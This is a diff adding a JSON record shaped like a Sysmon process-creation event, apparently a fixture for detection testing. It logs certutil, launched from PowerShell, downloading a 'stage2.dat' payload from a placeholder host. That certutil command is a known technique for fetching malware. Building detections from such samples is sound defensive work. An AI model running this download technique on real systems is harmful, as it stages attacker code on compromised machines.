@@ -1,0 +1,11 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-10-06 13:25:03.512",
+  "Computer": "WS-HR-021.corp.example",
+  "User": "CORP\\mkelly",
+  "ProcessId": 9380,
+  "Image": "C:\\Windows\\System32\\certutil.exe",
+  "CommandLine": "certutil -verifyctl -f -split https://files.example.invalid/stage2.dat",
+  "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "ParentCommandLine": "powershell.exe"
+}
